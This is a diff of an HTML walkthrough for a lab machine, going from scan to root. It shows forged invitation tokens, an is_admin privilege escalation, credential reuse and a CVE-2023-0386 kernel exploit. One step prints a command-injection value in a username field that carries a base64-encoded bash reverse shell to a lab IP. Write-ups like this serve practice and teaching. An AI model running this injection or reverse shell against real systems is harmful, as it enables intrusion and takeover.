@@ -14,31 +14,54 @@
   </header>
 
    <section>
-    <h2>Whole Process : from IP to ROOT</h2>
-      <h3>VPN</h3>
+    <h2>VPN</h2>
        <p>Connect to vpn using openvpn</p>
-      <h3>Scan</h3>
+   </section>
+  
+   <section>
+    <h2>Scan</h2>
        <p>Scan IP with nmap</p>
        <p>found ports open : 22, 80 and domain name</p>
-      <h3>DNS</h3>
+   </section>
+
+   <section>
+    <h2>DNS</h2>
        <p>add domain into /etc/hosts file</p>
-      <h3>JS - Endpoint Discovery via Information Disclosure</h3>
+   </section>
+
+   <section>
+    <h2>JS - Endpoint Discovery via Information Disclosure</h2>
        <p>Information Disclosure : Check Source Code, open inviteapi.min.js file</p>
        <p>Endpoint Discovery : Deobfuscate js code using https://lelinhtinh.github.io/de4js/, we found an Endpoint that explains how to authenticate</p>
-      <h3>API - Authentication via Forged Crendentials via Broken Access Control</h3>
+   </section>
+
+   <section>
+    <h2>API - Authentication via Forged Crendentials via Broken Access Control</h2>
        <p>Broken Access Control : send a POST request to generate an invitation to authenticate then base64decode token</p>
        <p>Forged Credentials : send token as proof of invitation</p>
        <p>Authentication : authenticate after Signing up with any email</p>
-      <h3>Admin - Escalate Privileges via Broken Access Control</h3>
+   </section>
+
+   <section>
+    <h2>Admin - Escalate Privileges via Broken Access Control</h2>
        <p>Broken Access Control : send a PUT request to update profile with parameter is_admin set to 1</p>
        <p>Escalate Privileges to admin</p>
-      <h3>WWW - Initial Access via Command Injection</h3>
+   </section>
+
+   <section>
+    <h2>WWW - Initial Access via Command Injection</h2>
        <p>Command Injection : API endpoint to generate vpn, pass command in username parameter {"username":"myUser;id;"}</p>
        <p>Initial Access : listen on port 1234, inject reverse shell (base64encoded) {"username":"myUser;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi41MC8xMjM0IDA+JjE= | base64 -d | bash;"}</p>
-      <h3>User - SSH Takeover via Credentials Theft</h3>
+   </section>
+  
+   <section>
+    <h2>User - SSH Takeover via Credentials Theft</h2>
        <p>Credentials Theft / Information Disclosure : read .env file to find DB username:password</p>
        <p>SSH Takeover : connect to user@server using the DB password that is reused</p>
-      <h3>Root - Escalate Privileges via Vulnerability Research via Information Disclosure</h3>
+   </section>
+
+   <section>
+    <h2>Root - Escalate Privileges via Vulnerability Research via Information Disclosure</h2>
        <p>Information Disclosure : The OverlayFS / FUSE kernel exploit, is mentioned in the mail</p>
        <p>Vulnerability Research : ExploitDB CVE-2023–0386</p>
        <p>Escalate Privileges : clone git repository, copy it to server, run exploit</p>
